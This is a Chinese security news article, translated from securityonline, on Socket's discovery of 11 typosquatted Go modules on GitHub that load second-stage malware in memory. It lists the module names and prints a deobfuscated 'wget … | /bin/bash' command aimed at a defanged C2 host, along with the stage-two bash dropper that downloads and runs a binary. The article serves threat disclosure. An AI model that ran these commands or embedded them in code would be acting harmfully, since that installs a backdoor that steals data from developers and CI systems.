---
title: 恶意Go模块肆虐GitHub：11个软件包暗藏内存加载型后门
url: https://www.anquanke.com/post/id/310928
source: 安全客-有思想的安全新媒体
date: 2025-08-09
fetch_date: 2025-10-07T00:17:33.381275
---

# 恶意Go模块肆虐GitHub：11个软件包暗藏内存加载型后门

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 恶意Go模块肆虐GitHub：11个软件包暗藏内存加载型后门

阅读量**80028**

发布时间 : 2025-08-08 17:14:51

**x**

##### 译文声明

本文是翻译文章，文章原作者 Ddos，文章来源：securityonline

原文地址：<https://securityonline.info/the-malicious-go-modules-11-malicious-go-packages-found-on-github-deploying-stealthy-malware/>

译文仅供参考，具体内容表达以及含义原文为准。

![]()

Socket 威胁研究团队近日发现了一波令人担忧的恶意 Go 软件包，其中部分仍在 GitHub 上可访问。这些包通过隐蔽的混淆加载器和实时的二阶段载荷，意图**攻击开发者和持续集成（CI）流水线**。

此次行动与过去的开源供应链攻击类似。研究人员共发现了 **11 个**恶意 Go 模块，其中 **8 个**是“拼写劫持”（typosquatting）包，这些模块会在用户不知情的情况下投递二阶段恶意软件。它们通过 GitHub 等公共代码库分发，内部包含经过混淆的载荷加载器，能够在内存中直接执行命令，从而绕过基于磁盘的检测手段。

Socket 报告称：

> “在运行时，这些代码会悄悄启动一个 shell，从一组可互换的 .icu 和 .tech C2（命令与控制）端点中拉取二阶段载荷，并直接在内存中执行。”

这种攻击方式危险性极高，因为它具备跨平台兼容性——既能影响基于 Linux 的构建系统，也能攻击 Windows 工作站。更令人担忧的是，在披露时，**10 个 C2 URL 中有 6 个仍处于活跃状态**。

攻击者同时利用**“拼写劫持”**和**“命名空间混淆”**来伪装成合法软件包。已发现的恶意模块包括：

* github.com/stripedconsu/linker
* github.com/agitatedleopa/stm
* github.com/expertsandba/opt
* github.com/wetteepee/hcloud-ip-floater
* github.com/weightycine/replika
* github.com/ordinarymea/tnsr\_ids
* github.com/ordinarymea/TNSR\_IDS
* github.com/cavernouskina/mcp-go
* github.com/lastnymph/gouid
* github.com/sinfulsky/gouid
* github.com/briefinitia/gouid

每个包都在**代码深处**（往往隐藏在数百行之后）埋藏了危险命令。载荷通常通过一个基于索引的字符串数组构造，在运行时拼接成 shell 命令，例如：

```
/bin/sh -c wget -O - https://monsoletter[.]icu/storage/de373d0df/a31546bf | /bin/bash &
```

研究人员解释说，这种混淆手法是先建立一个字符串数组，再通过调用数组的不同索引，按顺序拼接成完整命令。

执行后，恶意软件会下载一个 shell 脚本，该脚本再根据操作系统类型拉取恶意的 ELF（Linux）或 PE（Windows）二进制文件并执行。

其中一个仍在线的脚本（来自 https://monsoletter[.]icu/storage/de373d0df/f0eee999）会先检查系统是否为 Linux 环境，再休眠 3600 秒（以躲避沙箱检测），然后下载二进制文件、赋予执行权限并运行：

```
#!/bin/bash

cd ~
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
	if ! [ -f ./f0eee999 ]; then
		sleep 3600
		wget https://monsoletter[.]icu/storage/de373d0df/f0eee999
		chmod +x ./f0eee999
		app_process_id=$(pidof f0eee999)
		if [[ -z $app_process_id ]]; then
			./f0eee999
		fi
	fi
fi
```

下载的二进制文件（SHA256：844013025bf7c5d01e6f48df0e990103…）会读取浏览器数据、收集系统信息，并与外部服务器通信，从而在受害系统中建立后门访问。

其他恶意包（如 replika、tnsr\_ids 以及 gouid 系列）则在 Windows 系统上使用 `certutil.exe` 执行类似命令，在后台下载并运行恶意 EXE 文件。

攻击者的常用手段之一是“拼写劫持”，即使用与合法模块名称极为相似的名称发布恶意包。

此外，Go 的**去中心化特性**也增加了风险——很难区分合法包与恶意仿冒包。开发者常直接从 GitHub 导入模块，这种不明确的信任边界更容易导致误安装。

虽然目前的溯源结果还不确定，但 Socket 指出，10 个恶意 URL 中有 7 个路径结构相同（`/storage/de373d0df/a31546bf`），且多个包共用相同的 C2 端点，这强烈暗示其中部分包出自同一攻击者之手。

> “由于 C2 复用以及代码格式一致，我们更有信心认为部分恶意包来自同一威胁行为者。”

不过，单凭混淆方式一致并不能完全证明同一作者——在威胁行为者圈子里，**代码复用**十分常见。

本文翻译自securityonline [原文链接](https://securityonline.info/the-malicious-go-modules-11-malicious-go-packages-found-on-github-deploying-stealthy-malware/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/310928](/post/id/310928)

安全KER - 有思想的安全新媒体

本文转载自: [securityonline](https://securityonline.info/the-malicious-go-modules-11-malicious-go-packages-found-on-github-deploying-stealthy-malware/)

如若转载,请注明出处： <https://securityonline.info/the-malicious-go-modules-11-malicious-go-packages-found-on-github-deploying-stealthy-malware/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [安全资讯](/tag/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF)
* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**2赞

收藏

![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p2.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=171771)

[安全客](/member.html?memberId=171771)

这个人太懒了，签名都懒得写一个

* 文章
* **545**

* 粉丝
* **5**

### TA的文章

* ##### [国庆重保+攻防演练大考在即！360大模型安全服务专项方案筑牢AI防线](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta 旨在打造机器人领域的“Android”，为下一代人形AI提供通用平台](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33

### 相关文章

* ##### [国庆重保+攻防演练大考在即！360大模型安全服务专项方案筑牢AI防线](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta 旨在打造机器人领域的“Android”，为下一代人形AI提供通用平台](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)